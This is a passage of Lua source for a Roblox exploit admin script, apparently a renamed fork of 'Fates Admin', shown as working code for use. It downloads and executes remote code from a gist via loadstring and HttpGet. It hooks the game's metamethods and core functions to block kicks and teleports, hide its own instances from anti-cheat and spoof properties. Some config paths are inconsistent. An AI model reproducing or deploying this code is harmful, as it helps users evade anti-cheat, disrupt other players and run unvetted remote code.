a = false
wait(0.2)
attackinglol = false
standing = false

hostusername = "a"  -- case sencitive 




local AkaliNotif = loadstring(game:HttpGet("https://gist.githubusercontent.com/cyberical9B55/9d907e7d3935f96a95497abe4f3ed4f8/raw/0239bdbf9f3a058668f985da6f0af90f8da52d2c/notifications"))();
local Notify = AkaliNotif.Notify;
    local player = game.Players.LocalPlayer
wait(1);
Notify({ 
Description = "hello "..player.Name.." please enjoy";
Title = "welcome";
Duration = 5;
});

joinleavelogs = false


    game.Players.PlayerAdded:Connect(function(plr)
if joinleavelogs == true then
Notify({ 
Description = "somone has joined the server";
Title = "new player join";
Duration = 2;
});
end
    
    game.Players.PlayerRemoved:Connect(function(plr)
if joinleavelogs == true then
Notify({ 
Description = "player leave";
Title = "somone has left the server";
Duration = 2;
});
end
end)
end)


local game = game
local GetService = game.GetService
if (not game.IsLoaded(game)) then
    local Loaded = game.Loaded
    Loaded.Wait(Loaded);
end

local _L = {}

_L.start = start or tick();
local Debug = true

do
    local F_A = getgenv().F_A
    if (F_A) then
        local Notify, GetConfig = F_A.Utils.Notify, F_A.GetConfig
        local UserInputService = GetService(game, "UserInputService");
        local CommandBarPrefix = GetConfig().CommandBarPrefix
        local StringKeyCode = UserInputService.GetStringForKeyCode(UserInputService, Enum.KeyCode[CommandBarPrefix]);
        return Notify(nil, "Loaded", "fates admin is already loaded... use 'killscript' to kill", nil),
        Notify(nil, "Your Prefix is", string.format("%s (%s)", StringKeyCode, CommandBarPrefix));
    end
end

--IMPORT [var]
local Services = {
    Workspace = GetService(game, "Workspace");
    UserInputService = GetService(game, "UserInputService");
    ReplicatedStorage = GetService(game, "ReplicatedStorage");
    StarterPlayer = GetService(game, "StarterPlayer");
    StarterPack = GetService(game, "StarterPack");
    StarterGui = GetService(game, "StarterGui");
    TeleportService = GetService(game, "TeleportService");
    CoreGui = GetService(game, "CoreGui");
    TweenService = GetService(game, "TweenService");
    HttpService = GetService(game, "HttpService");
    TextService = GetService(game, "TextService");
    MarketplaceService = GetService(game, "MarketplaceService");
    Chat = GetService(game, "Chat");
    Teams = GetService(game, "Teams");
    SoundService = GetService(game, "SoundService");
    Lighting = GetService(game, "Lighting");
    ScriptContext = GetService(game, "ScriptContext");
    Stats = GetService(game, "Stats");
}

setmetatable(Services, {
    __index = function(Table, Property)
        local Ret, Service = pcall(GetService, game, Property);
        if (Ret) then
            Services[Property] = Service
            return Service
        end
        return nil
    end,
    __mode = "v"
});

local GetChildren, GetDescendants = game.GetChildren, game.GetDescendants
local IsA = game.IsA
local FindFirstChild, FindFirstChildOfClass, FindFirstChildWhichIsA, WaitForChild = 
    game.FindFirstChild,
    game.FindFirstChildOfClass,
    game.FindFirstChildWhichIsA,
    game.WaitForChild

local GetPropertyChangedSignal, Changed = 
    game.GetPropertyChangedSignal,
    game.Changed
    
local Destroy, Clone = game.Destroy, game.Clone

local Heartbeat, Stepped, RenderStepped;
do
    local RunService = Services.RunService;
    Heartbeat, Stepped, RenderStepped =
        RunService.Heartbeat,
        RunService.Stepped,
        RunService.RenderStepped
end

local Players = Services.Players
local GetPlayers = Players.GetPlayers

local JSONEncode, JSONDecode, GenerateGUID = 
    Services.HttpService.JSONEncode, 
    Services.HttpService.JSONDecode,
    Services.HttpService.GenerateGUID

local Camera = Services.Workspace.CurrentCamera

local Tfind, sort, concat, pack, unpack;
do
    local table = table
    Tfind, sort, concat, pack, unpack = 
        table.find, 
        table.sort,
        table.concat,
        table.pack,
        table.unpack
end

local lower, upper, Sfind, split, sub, format, len, match, gmatch, gsub, byte;
do
    local string = string
    lower, upper, Sfind, split, sub, format, len, match, gmatch, gsub, byte = 
        string.lower,
        string.upper,
        string.find,
        string.split, 
        string.sub,
        string.format,
        string.len,
        string.match,
        string.gmatch,
        string.gsub,
        string.byte
end

local random, floor, round, abs, atan, cos, sin, rad;
do
    local math = math
    random, floor, round, abs, atan, cos, sin, rad = 
        math.random,
        math.floor,
        math.round,
        math.abs,
        math.atan,
        math.cos,
        math.sin,
        math.rad
end

local InstanceNew = Instance.new
local CFrameNew = CFrame.new
local Vector3New = Vector3.new

local Inverse, toObjectSpace, components
do
    local CalledCFrameNew = CFrameNew();
    Inverse = CalledCFrameNew.Inverse
    toObjectSpace = CalledCFrameNew.toObjectSpace
    components = CalledCFrameNew.components
end

local Connection = game.Loaded
local CWait = Connection.Wait
local CConnect = Connection.Connect

local Disconnect;
do
    local CalledConnection = CConnect(Connection, function() end);
    Disconnect = CalledConnection.Disconnect
end

local __H = InstanceNew("Humanoid");
local UnequipTools = __H.UnequipTools
local ChangeState = __H.ChangeState
local SetStateEnabled = __H.SetStateEnabled
local GetState = __H.GetState
local GetAccessories = __H.GetAccessories

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer.PlayerGui
local Mouse = LocalPlayer.GetMouse(LocalPlayer);

local CThread;
do
    local wrap = coroutine.wrap
    CThread = function(Func, ...)
        if (type(Func) ~= 'function') then
            return nil
        end
        local Varag = ...
        return function()
            local Success, Ret = pcall(wrap(Func, Varag));
            if (Success) then
                return Ret
            end
            if (Debug) then
              print("erroRRR???");
            end
        end
    end
end

local startsWith = function(str, searchString, rawPos)
    local pos = rawPos or 1
    return searchString == "" and true or sub(str, pos, pos) == searchString
end

local trim = function(str)
    return gsub(str, "^%s*(.-)%s*$", "%1");
end

local tbl_concat = function(...)
    local new = {}
    for i, v in next, {...} do
        for i2, v2 in next, v do
            new[i] = v2
        end
    end
    return new
end

local indexOf = function(tbl, val)
    if (type(tbl) == 'table') then
        for i, v in next, tbl do
            if (v == val) then
                return i
            end
        end
    end
end

local forEach = function(tbl, ret)
    for i, v in next, tbl do
        ret(i, v);
    end
end

local filter = function(tbl, ret)
    if (type(tbl) == 'table') then
        local new = {}
        for i, v in next, tbl do
            if (ret(i, v)) then
                new[#new + 1] = v
            end
        end
        return new
    end
end

local map = function(tbl, ret)
    if (type(tbl) == 'table') then
        local new = {}
        for i, v in next, tbl do
            local Value, Key = ret(i, v);
            new[Key or #new + 1] = Value
        end
        return new
    end
end

local deepsearch;
deepsearch = function(tbl, ret)
    if (type(tbl) == 'table') then
        for i, v in next, tbl do
            if (type(v) == 'table') then
                deepsearch(v, ret);
            end
            ret(i, v);
        end
    end
end

local deepsearchset;
deepsearchset = function(tbl, ret, value)
    if (type(tbl) == 'table') then
        local new = {}
        for i, v in next, tbl do
            new[i] = v
            if (type(v) == 'table') then
                new[i] = deepsearchset(v, ret, value);
            end
            if (ret(i, v)) then
                new[i] = value(i, v);
            end
        end
        return new
    end
end

local flat = function(tbl)
    if (type(tbl) == 'table') then
        local new = {}
        deepsearch(tbl, function(i, v)
            if (type(v) ~= 'table') then
                new[#new + 1] = v
            end
        end)
        return new
    end
end

local flatMap = function(tbl, ret)
    if (type(tbl) == 'table') then
        local new = flat(map(tbl, ret));
        return new
    end
end

local shift = function(tbl)
    if (type(tbl) == 'table') then
        local firstVal = tbl[1]
        tbl = pack(unpack(tbl, 2, #tbl));
        tbl.n = nil
        return tbl
    end
end

local keys = function(tbl)
    if (type(tbl) == 'table') then
        local new = {}
        for i, v in next, tbl do
            new[#new + 1] = i	
        end
        return new
    end
end

local function clone(toClone, shallow)
    if (type(toClone) == 'function' and clonefunction) then
        return clonefunction(toClone);
    end
    local new = {}
    for i, v in pairs(toClone) do
        if (type(v) == 'table' and not shallow) then
            v = clone(v);
        end
        new[i] = v
    end
    return new
end

local setthreadidentity = setthreadidentity or syn_context_set or setthreadcontext
local getthreadidentity = getthreadidentity or syn_context_get or getthreadcontext
--END IMPORT [var]



local GetCharacter = GetCharacter or function(Plr)
    return Plr and Plr.Character or LocalPlayer.Character
end

local Utils = {}

--IMPORT [extend]
local SocialService = game:GetService("SocialService")
local firetouchinterest, hookfunction, getconnections;
do
    local GEnv = getgenv();
    local touched = {}
    firetouchinterest = GEnv.firetouchinterest or function(part1, part2, toggle)
        if (part1 and part2) then
            if (toggle == 0) then
                touched[1] = part1.CFrame
                part1.CFrame = part2.CFrame
            else
                part1.CFrame = touched[1]
                touched[1] = nil
            end
        end
    end
    local newcclosure = newcclosure or function(f)
        return f
    end

    hookfunction = GEnv.hookfunction or function(func, newfunc, applycclosure)
        if (replaceclosure) then
            replaceclosure(func, newfunc);
            return func
        end
        func = applycclosure and newcclosure or newfunc
        return func
    end

    local CachedConnections = setmetatable({}, {
        __mode = "v"
    });

    getconnections = function(Connection, FromCache, AddOnConnect)
        local getconnections = GEnv.getconnections
        if (not getconnections) then
            return {}
        end
        
        local CachedConnection;
        for i, v in next, CachedConnections do
            if (i == Connection) then
                CachedConnection = v
                break;
            end
        end
        if (CachedConnection and FromCache) then
            return CachedConnection
        end

        local Connections = GEnv.getconnections(Connection);
        CachedConnections[Connection] = Connections
        return Connections
    end
end

local getrawmetatable = getrawmetatable or function()
    return setmetatable({}, {});
end

local getnamecallmethod = getnamecallmethod or function()
    return ""
end

local checkcaller = checkcaller or function()
    return false
end

local Hooks = {
    AntiKick = false,
    AntiTeleport = false,
    NoJumpCooldown = false,
}

local mt = getrawmetatable(game);
local OldMetaMethods = {}
setreadonly(mt, false);
for i, v in next, mt do
    OldMetaMethods[i] = v
end
setreadonly(mt, true);
local MetaMethodHooks = {}

local ProtectInstance, SpoofInstance, SpoofProperty;
local UnSpoofInstance;
local ProtectedInstances = setmetatable({}, {
    __mode = "v"
});
do
    local SpoofedInstances = setmetatable({}, {
        __mode = "v"
    });
    local SpoofedProperties = {}
    Hooks.SpoofedProperties = SpoofedProperties

    ProtectInstance = function(Instance_)
        if (not Tfind(ProtectedInstances, Instance_)) then
            ProtectedInstances[#ProtectedInstances + 1] = Instance_
        end
    end
    
    SpoofInstance = function(Instance_, Instance2)
        if (not SpoofedInstances[Instance_]) then
            SpoofedInstances[Instance_] = Instance2 and Instance2 or Clone(Instance_);
        end
    end

    UnSpoofInstance = function(Instance_)
        if (SpoofedInstances[Instance_]) then
            SpoofedInstances[Instance_] = nil
        end
    end
    
    local ChangedSpoofedProperties = {}
    SpoofProperty = function(Instance_, Property, NoClone)
        if (SpoofedProperties[Instance_]) then
            local SpoofedPropertiesForInstance = SpoofedProperties[Instance_]
            local Properties = map(SpoofedPropertiesForInstance, function(i, v)
                return v.Property
            end)
            if (not Tfind(Properties, Property)) then
                SpoofedProperties[Instance_][#SpoofedPropertiesForInstance + 1] = {
                    SpoofedProperty = SpoofedPropertiesForInstance.SpoofedProperty,
                    Property = Property,
                };
            end
        else
            local Cloned;
            if (not NoClone and IsA(Instance_, "Instance") and not Services[tostring(Instance_)] and Instance_.Archivable) then
                local Success, Ret = pcall(Clone, Instance_);
                if (Success) then
                    Cloned = Ret
                end
            end
            SpoofedProperties[Instance_] = {{
                SpoofedProperty = Cloned and Cloned or {[Property]=Instance_[Property]},
                Property = Property,
            }}
            ChangedSpoofedProperties[Instance_] = {}
        end
    end

    local GetAllParents = function(Instance_, NIV)
        if (typeof(Instance_) == "Instance") then
            local Parents = {}
            local Current = NIV or Instance_
            if (NIV) then
                Parents[#Parents + 1] = Current
            end
            repeat
                local Parent = Current.Parent
                Parents[#Parents + 1] = Parent
                Current = Parent
            until not Current
            return Parents
        end
        return {}
    end
    
    local Methods = {
        "FindFirstChild",
        "FindFirstChildWhichIsA",
        "FindFirstChildOfClass",
        "IsA"
    }

    MetaMethodHooks.Namecall = function(...)
        local __Namecall = OldMetaMethods.__namecall;
        local Args = {...}
        local self = Args[1]
        local Method = getnamecallmethod() or "";

        if (Method ~= "") then
            local Success = pcall(OldMetaMethods.__index, self, Method);
            if (not Success) then
                return __Namecall(...);
            end
        end

        if (Hooks.AntiKick and lower(Method) == "kick") then
            local Player, Message = self, Args[2]
            if (Hooks.AntiKick and Player == LocalPlayer) then
                local Notify = Utils.Notify
                local Context;
                if (setthreadidentity) then
                    Context = getthreadidentity();
                    setthreadidentity(3);
                end
                if (Notify and Context) then
                    Notify(nil, "Attempt to kick", format("attempt to kick %s", (Message and type(Message) == 'number' or type(Message) == 'string') and ": " .. Message or ""));
                    setthreadidentity(Context);
                end
                return
            end
        end

        if (Hooks.AntiTeleport and Method == "Teleport" or Method == "TeleportToPlaceInstance") then
            local Player, PlaceId = self, Args[2]
            if (Hooks.AntiTeleport and Player == LocalPlayer) then
                local Notify = Utils.Notify
                local Context;
                if (setthreadidentity) then
                    Context = getthreadidentity();
                    setthreadidentity(3);
                end
                if (Notify and Context) then
                    Notify(nil, "Attempt to teleport", format("attempt to teleport to place %s", PlaceId and PlaceId or ""));
                    setthreadidentity(Context);
                end
                return
            end
        end

        if (checkcaller()) then
            return __Namecall(...);
        end

        if (Tfind(Methods, Method)) then
            local ReturnedInstance = __Namecall(...);
            if (Tfind(ProtectedInstances, ReturnedInstance)) then
                return Method == "IsA" and false or nil
            end
        end
        
        if (lower(Method) == "getchildren" or lower(Method) == "getdescendants") then
            return filter(__Namecall(...), function(i, v)
                local Protected = false
                for i2 = 1, #ProtectedInstances do
                    local ProtectedInstance = ProtectedInstances[i2]
                    Protected = ProtectedInstance == v or v.IsDescendantOf(v, ProtectedInstance);
                    if (Protected) then
                        break;
                    end
                end
                return not Protected
            end)
        end

        if (Method == "GetFocusedTextBox") then
            local Protected = false
            for i = 1, #ProtectedInstances do
                local ProtectedInstance = ProtectedInstances[i]
                Protected = not Tfind(ProtectedInstances, FocusedTextBox) or FocusedTextBox.IsDescendantOf(FocusedTextBox, ProtectedInstance);
            end
            if (Protected) then
                return nil
            end
        end

        if (Hooks.NoJumpCooldown and Method == "GetState" or Method == "GetStateEnabled") then
            local State = __Namecall(...);
            if (Method == "GetState" and (State == Enum.HumanoidStateType.Jumping or State == "Jumping")) then
                return Enum.HumanoidStateType.RunningNoPhysics
            end
            if (Method == "GetStateEnabled" and (self == Enum.HumanoidStateType.Jumping or self == "Jumping")) then
                return false
            end
        end

        return __Namecall(...);
    end

    local AllowedIndexes = {
        "RootPart",
        "Parent"
    }
    local AllowedNewIndexes = {
        "Jump"
    }
    MetaMethodHooks.Index = function(...)
        local __Index = OldMetaMethods.__index;

        if (checkcaller()) then
            return __Index(...);
        end
        local Instance_, Index = ...

        local SanitisedIndex = Index
        if (typeof(Instance_) == 'Instance' and type(Index) == 'string') then
            SanitisedIndex = gsub(sub(Index, 0, 100), "%z.*", "");
        end
        local SpoofedInstance = SpoofedInstances[Instance_]
        local SpoofedPropertiesForInstance = SpoofedProperties[Instance_]

        if (SpoofedInstance) then
            if (Tfind(AllowedIndexes, SanitisedIndex)) then
                return __Index(Instance_, Index);
            end
            return __Index(SpoofedInstance, Index);
        end

        if (SpoofedPropertiesForInstance) then
            for i, SpoofedProperty in next, SpoofedPropertiesForInstance do
                local SanitisedIndex = gsub(SanitisedIndex, "^%l", upper);
                if (SanitisedIndex == SpoofedProperty.Property) then
                    local ClientChangedData = ChangedSpoofedProperties[Instance_][SanitisedIndex]
                    local IndexedSpoofed = __Index(SpoofedProperty.SpoofedProperty, Index);
                    local Indexed = __Index(Instance_, Index);
                    if (ClientChangedData.Caller and ClientChangedData.Value ~= Indexed) then
                        OldMetaMethods.__newindex(SpoofedProperty.SpoofedProperty, Index, Indexed);
                        OldMetaMethods.__newindex(Instance_, Index, ClientChangedData.Value);
                        return Indexed
                    end
                    return IndexedSpoofed
                end
            end
        end

        if (Tfind(ProtectedInstances, __Index(...))) then
            return nil
        end
        if (Tfind(ProtectedInstances, Instance_) and SanitisedIndex == "ClassName") then
            return "Part"
        end

        if (Hooks.NoJumpCooldown and SanitisedIndex == "Jump") then
            if (IsA(Instance_, "Humanoid")) then
                return false
            end
        end
        
        return __Index(...);
    end

    MetaMethodHooks.NewIndex = function(...)
        local __NewIndex = OldMetaMethods.__newindex;
        local __Index = OldMetaMethods.__index;
        local Instance_, Index, Value = ...

        local SpoofedInstance = SpoofedInstances[Instance_]
        local SpoofedPropertiesForInstance = SpoofedProperties[Instance_]

        if (checkcaller()) then
            if (Index == "Parent" and Value) then
                local ProtectedInstance
                for i = 1, #ProtectedInstances do
                    local ProtectedInstance_ = ProtectedInstances[i]
                    if (Instance_ == ProtectedInstance_ or Instance_.IsDescendantOf(Value, ProtectedInstance_)) then
                        ProtectedInstance = true
                    end
                end
                if (ProtectedInstance) then
                    local Parents = GetAllParents(Instance_, Value);
                    for i, v in next, getconnections(Parents[1].ChildAdded, true) do
                        v.Disable(v);
                    end
                    for i = 1, #Parents do
                        local Parent = Parents[i]
                        for i2, v in next, getconnections(Parent.DescendantAdded, true) do
                            v.Disable(v);
                        end
                    end
                    local Ret = __NewIndex(...);
                    for i = 1, #Parents do
                        local Parent = Parents[i]
                        for i2, v in next, getconnections(Parent.DescendantAdded, true) do
                            v.Enable(v);
                        end
                    end
                    for i, v in next, getconnections(Parents[1].ChildAdded, true) do
                        v.Enable(v);
                    end
                    return Ret
                end
            end
            if (SpoofedInstance or SpoofedPropertiesForInstance) then
                if (SpoofedPropertiesForInstance) then
                    ChangedSpoofedProperties[Instance_][Index] = {
                        Caller = true,
                        BeforeValue = Instance_[Index],
                        Value = Value
                    }
                end
                local Connections = tbl_concat(
                    getconnections(GetPropertyChangedSignal(Instance_, SpoofedPropertiesForInstance and SpoofedPropertiesForInstance.Property or Index)),
                    getconnections(Instance_.Changed),
                    getconnections(game.ItemChanged)
                )
                
                if (not next(Connections)) then
                    return __NewIndex(Instance_, Index, Value);
                end
                for i, v in next, Connections do
                    v.Disable(v);
                end
                local Ret = __NewIndex(Instance_, Index, Value);
                for i, v in next, Connections do
                    v.Enable(v);
                end
                return Ret
            end
            return __NewIndex(...);
        end

        local SanitisedIndex = Index
        if (typeof(Instance_) == 'Instance' and type(Index) == 'string') then
            SanitisedIndex = gsub(sub(Index, 0, 100), "%z.*", "");
        end

        if (SpoofedInstance) then
            if (Tfind(AllowedNewIndexes, SanitisedIndex)) then
                return __NewIndex(...);
            end
            return __NewIndex(SpoofedInstance, Index, __Index(SpoofedInstance, Index));
        end

        if (SpoofedPropertiesForInstance) then
            for i, SpoofedProperty in next, SpoofedPropertiesForInstance do
                if (SpoofedProperty.Property == SanitisedIndex and not Tfind(AllowedIndexes, SanitisedIndex)) then
                    ChangedSpoofedProperties[Instance_][SanitisedIndex] = {
                        Caller = false,
                        BeforeValue = Instance_[Index],
                        Value = Value
                    }
                    return __NewIndex(SpoofedProperty.SpoofedProperty, Index, Value);
                end
            end
        end

        return __NewIndex(...);
    end

    local hookmetamethod = hookmetamethod or function(metatable, metamethod, func)
        setreadonly(metatable, false);
        Old = hookfunction(metatable[metamethod], func, true);
        setreadonly(metatable, true);
        return Old
    end

    OldMetaMethods.__index = hookmetamethod(game, "__index", MetaMethodHooks.Index);
    OldMetaMethods.__newindex = hookmetamethod(game, "__newindex", MetaMethodHooks.NewIndex);
    OldMetaMethods.__namecall = hookmetamethod(game, "__namecall", MetaMethodHooks.Namecall);
end

Hooks.OldGetChildren = hookfunction(game.GetChildren, newcclosure(function(...)
    if (not checkcaller()) then
        local Children = Hooks.OldGetChildren(...);
        return filter(Children, function(i, v)
            return not Tfind(ProtectedInstances, v);
        end)
    end
    return Hooks.OldGetChildren(...);
end));

Hooks.OldGetDescendants = hookfunction(game.GetDescendants, newcclosure(function(...)
    if (not checkcaller()) then
        local Descendants = Hooks.OldGetDescendants(...);
        return filter(Descendants, function(i, v)
            local Protected = false
            for i2 = 1, #ProtectedInstances do
                local ProtectedInstance = ProtectedInstances[i2]
                Protected = v and ProtectedInstance == v or v.IsDescendantOf(v, ProtectedInstance)
                if (Protected) then
                    break;
                end
            end
            return not Protected
        end)
    end
    return Hooks.OldGetDescendants(...);
end));

Hooks.FindFirstChild = hookfunction(game.FindFirstChild, newcclosure(function(...)
    if (not checkcaller()) then
        local ReturnedInstance = Hooks.FindFirstChild(...);
        if (ReturnedInstance and Tfind(ProtectedInstances, ReturnedInstance)) then
            return nil
        end
    end
    return Hooks.FindFirstChild(...);
end));
Hooks.FindFirstChildOfClass = hookfunction(game.FindFirstChildOfClass, newcclosure(function(...)
    if (not checkcaller()) then
        local ReturnedInstance = Hooks.FindFirstChildOfClass(...);
        if (ReturnedInstance and Tfind(ProtectedInstances, ReturnedInstance)) then
            return nil
        end
    end
    return Hooks.FindFirstChildOfClass(...);
end));
Hooks.FindFirstChildWhichIsA = hookfunction(game.FindFirstChildWhichIsA, newcclosure(function(...)
    if (not checkcaller()) then
        local ReturnedInstance = Hooks.FindFirstChildWhichIsA(...);
        if (ReturnedInstance and Tfind(ProtectedInstances, ReturnedInstance)) then
            return nil
        end
    end
    return Hooks.FindFirstChildWhichIsA(...);
end));
Hooks.IsA = hookfunction(game.IsA, newcclosure(function(...)
    if (not checkcaller()) then
        local Args = {...}
        local IsACheck = Args[1]
        if (IsACheck) then
            local ProtectedInstance = Tfind(ProtectedInstances, IsACheck);
            if (ProtectedInstance and Args[2]) then
                return false
            end
        end
    end
    return Hooks.IsA(...);
end));

local UndetectedCmdBar;
Hooks.OldGetFocusedTextBox = hookfunction(Services.UserInputService.GetFocusedTextBox, newcclosure(function(...)
    if (not checkcaller() and UndetectedCmdBar) then
        local FocusedTextBox = Hooks.OldGetFocusedTextBox(...);
        local Protected = false
        for i = 1, #ProtectedInstances do
            local ProtectedInstance = ProtectedInstances[i]
            Protected = not Tfind(ProtectedInstances, FocusedTextBox) or FocusedTextBox.IsDescendantOf(FocusedTextBox, ProtectedInstance);
        end
        if (Protected) then
            return nil
        end
    end
    return Hooks.OldGetFocusedTextBox(...);
end));

Hooks.OldKick = hookfunction(LocalPlayer.Kick, newcclosure(function(...)
    local Player, Message = ...
    if (Hooks.AntiKick and Player == LocalPlayer) then
        local Notify = Utils.Notify
        local Context;
        if (setthreadidentity) then
            Context = getthreadidentity();
            setthreadidentity(3);
        end
        if (Notify and Context) then
            Notify(nil, "Attempt to kick", format("attempt to kick %s", (Message and type(Message) == 'number' or type(Message) == 'string') and ": " .. Message or ""));
            setthreadidentity(Context)
        end
        return
    end
    return Hooks.OldKick(...);
end))

Hooks.OldTeleportToPlaceInstance = hookfunction(Services.TeleportService.TeleportToPlaceInstance, newcclosure(function(...)
    local Player, PlaceId = ...
    if (Hooks.AntiTeleport and Player == LocalPlayer) then
        local Notify = Utils.Notify
        local Context;
        if (setthreadidentity) then
            Context = getthreadidentity();
            setthreadidentity(3);
        end
        if (Notify and Context) then
            Notify(nil, "Attempt to teleport", format("attempt to teleport to place %s", PlaceId and PlaceId or ""));
            setthreadidentity(Context)
        end
        return
    end
    return Hooks.OldTeleportToPlaceInstance(...);
end))
Hooks.OldTeleport = hookfunction(Services.TeleportService.Teleport, newcclosure(function(...)
    local Player, PlaceId = ...
    if (Hooks.AntiTeleport and Player == LocalPlayer) then
        local Notify = Utils.Notify
        local Context;
        if (setthreadidentity) then
            Context = getthreadidentity();
            setthreadidentity(3);
        end
        if (Notify and Context) then
            Notify(nil, "Attempt to teleport", format("attempt to teleport to place \"%s\"", PlaceId and PlaceId or ""));
            setthreadidentity(Context);
        end
        return
    end
    return Hooks.OldTeleport(...);
end))

Hooks.GetState = hookfunction(GetState, function(...)
    local Humanoid, State = ..., Hooks.GetState(...);
    local Parent, Character = Humanoid.Parent, LocalPlayer.Character
    if (Hooks.NoJumpCooldown and (State == Enum.HumanoidStateType.Jumping or State == "Jumping") and Parent and Character and Parent == Character) then
        return Enum.HumanoidStateType.RunningNoPhysics
    end
    return State
end)

Hooks.GetStateEnabled = hookfunction(__H.GetStateEnabled, function(...)
    local Humanoid, State = ...
    local Ret = Hooks.GetStateEnabled(...);
    local Parent, Character = Humanoid.Parent, LocalPlayer.Character
    if (Hooks.NoJumpCooldown and (State == Enum.HumanoidStateType.Jumping or State == "Jumping") and Parent and Character and Parent == Character) then
        return false
    end
    return Ret
end)
--END IMPORT [extend]



local GetRoot = function(Plr, Char)
    local LCharacter = GetCharacter();
    local Character = Char or GetCharacter(Plr);
    return Plr and Character and (FindFirstChild(Character, "HumanoidRootPart") or FindFirstChild(Character, "Torso") or FindFirstChild(Character, "UpperTorso")) or LCharacter and (FindFirstChild(LCharacter, "HumanoidRootPart") or FindFirstChild(LCharacter, "Torso") or FindFirstChild(LCharacter, "UpperTorso"));
end

local GetHumanoid = function(Plr, Char)
    local LCharacter = GetCharacter();
    local Character = Char or GetCharacter(Plr);
    return Plr and Character and FindFirstChildWhichIsA(Character, "Humanoid") or LCharacter and FindFirstChildWhichIsA(LCharacter, "Humanoid");
end

local GetMagnitude = function(Plr, Char)
    local LRoot = GetRoot();
    local Root = GetRoot(Plr, Char);
    return Plr and Root and (Root.Position - LRoot.Position).magnitude or math.huge
end

local Settings = {
    Prefix = "!",
    CommandBarPrefix = "Semicolon",
    ChatPrediction = false,
    Macros = {},
    Aliases = {},
}
local PluginSettings = {
    PluginsEnabled = true,
    PluginDebug = false,
    DisabledPlugins = {
        ["PluginName"] = true
    },
    SafePlugins = false
}

local WriteConfig = function(Destroy)
    local JSON = JSONEncode(Services.HttpService, Settings);
    local PluginJSON = JSONEncode(Services.HttpService, PluginSettings);
    if (isfolder("mafia-admin") and Destroy) then
        delfolder("mafia-admin");
        writefile("mafia-admin/config.json", JSON);
        writefile("fates/admin/pluings/plugin-conf.json", PluginJSON);
    else
        makefolder("mafia-admin");
        makefolder("mafia-admin/plugins");
        makefolder("mafia-admin/chatlogs");
        writefile("mafia-admin/config.json", JSON);
        writefile("mafia-admin/plugins/plugin-conf.json", PluginJSON);
    end
end

local GetConfig = function()
    if (isfolder("mafia-admin") and isfile("mafia-admin/config.json")) then
        return JSONDecode(Services.HttpService, readfile("mafia-admin/config.json"));
    else
        WriteConfig();
        return JSONDecode(Services.HttpService, readfile("mafia-admin/config.json"));
    end
end

local GetPluginConfig = function()
    if (isfolder("mafia-admin") and isfolder("mafia-admin/plugins") and isfile("mafia-admin/plugins/plugin-conf.json")) then
        local JSON = JSONDecode(Services.HttpService, readfile("mafia-admin/plugins/plugin-conf.json"));
        return JSON
    else
        WriteConfig();
        return JSONDecode(Services.HttpService, readfile("fates-admin/plugins/plugin-conf.json"));
    end
end

local SetPluginConfig = function(conf)
    if (isfolder("mafia-admin") and isfolder("mafia-admin/plugins") and isfile("mafia-admin/plugins/plugin-conf.json")) then
        WriteConfig();
    end
    local NewConfig = GetPluginConfig();
    for i, v in next, conf do
        NewConfig[i] = v
    end
    writefile("mafia-admin/plugins/plugin-conf.json", JSONEncode(Services.HttpService, NewConfig));
end

local SetConfig = function(conf)
    if (not isfolder("mafia-admin") and isfile("mafia-admin/config.json")) then
        WriteConfig();
    end
    local NewConfig = GetConfig();
    for i, v in next, conf do
        NewConfig[i] = v
    end
    writefile("mafia-admin/config.json", JSONEncode(Services.HttpService, NewConfig));
end

local CurrentConfig = GetConfig();
local Prefix = isfolder and CurrentConfig.Prefix or "!"
local Macros = CurrentConfig.Macros or {}
local AdminUsers = AdminUsers or {}
local Exceptions = Exceptions or {}
local Connections = {
    Players = {}
}
_L.CLI = false
_L.ChatLogsEnabled = true
_L.GlobalChatLogsEnabled = false
_L.HttpLogsEnabled = true

local GetPlayer;
GetPlayer = function(str, noerror)
    local CurrentPlayers = filter(GetPlayers(Players), function(i, v)
        return not Tfind(Exceptions, v);
    end)
    if (not str) then
        return {}
    end
    str = lower(trim(str));
    if (Sfind(str, ",")) then
        return flatMap(split(str, ","), function(i, v)
            return GetPlayer(v, noerror);
        end)
    end

    local Magnitudes = map(CurrentPlayers, function(i, v)
        return {v,(GetRoot(v).CFrame.p - GetRoot().CFrame.p).Magnitude}
    end)

    local PlayerArgs = {
        ["all"] = function()
            return filter(CurrentPlayers, function(i, v) -- removed all arg (but not really) due to commands getting messed up and people getting confused
                return v ~= LocalPlayer
            end)
        end,
        ["others"] = function()
            return filter(CurrentPlayers, function(i, v)
                return v ~= LocalPlayer
            end)
        end,
        ["nearest"] = function()
            sort(Magnitudes, function(a, b)
                return a[2] < b[2]
            end)
            return {Magnitudes[2][1]}
        end,
        ["farthest"] = function()
            sort(Magnitudes, function(a, b)
                return a[2] > b[2]
            end)
            return {Magnitudes[2][1]}
        end,
        ["random"] = function()
            return {CurrentPlayers[random(2, #CurrentPlayers)]}
        end,
        ["allies"] = function()
            local LTeam = LocalPlayer.Team
            return filter(CurrentPlayers, function(i, v)
                return v.Team == LTeam
            end)
        end,
        ["enemies"] = function()
            local LTeam = LocalPlayer.Team
            return filter(CurrentPlayers, function(i, v)
                return v.Team ~= LTeam
            end)
        end,
        ["npcs"] = function()
            local NPCs = {}
            local Descendants = GetDescendants(Workspace);
            local GetPlayerFromCharacter = Players.GetPlayerFromCharacter
            for i = 1, #Descendants do
                local Descendant = Descendants[i]
                local DParent = Descendant.Parent
                if (IsA(Descendant, "Humanoid") and IsA(DParent, "Model") and (FindFirstChild(DParent, "HumanoidRootPart") or FindFirstChild(DParent, "Head")) and GetPlayerFromCharacter(Players, DParent) == nil) then
                    local FakePlr = InstanceNew("Player"); -- so it can be compatible with commands
                    FakePlr.Character = DParent
                    FakePlr.Name = format("%s %s", DParent.Name, "- " .. Descendant.DisplayName);
                    NPCs[#NPCs + 1] = FakePlr
                end
            end
            return NPCs
        end,
        ["me"] = function()
            return {LocalPlayer}
        end
    }

    if (PlayerArgs[str]) then
        return PlayerArgs[str]();
    end

    local Players = filter(CurrentPlayers, function(i, v)
        return (sub(lower(v.Name), 1, #str) == str) or (sub(lower(v.DisplayName), 1, #str) == str);
    end)
    if (not next(Players) and not noerror) then
errored = true
wait(0.7)
ExecuteCommand("unattack", {}, LocalPlayer);
attackinglol = false
attackinglol = false
ExecuteCommand("summon", {}, LocalPlayer);
    end
    return Players
end

local AddConnection = function(Connection, CEnv, TblOnly)
    if (CEnv) then
        CEnv[#CEnv + 1] = Connection
        if (TblOnly) then
            return Connection
        end
    end
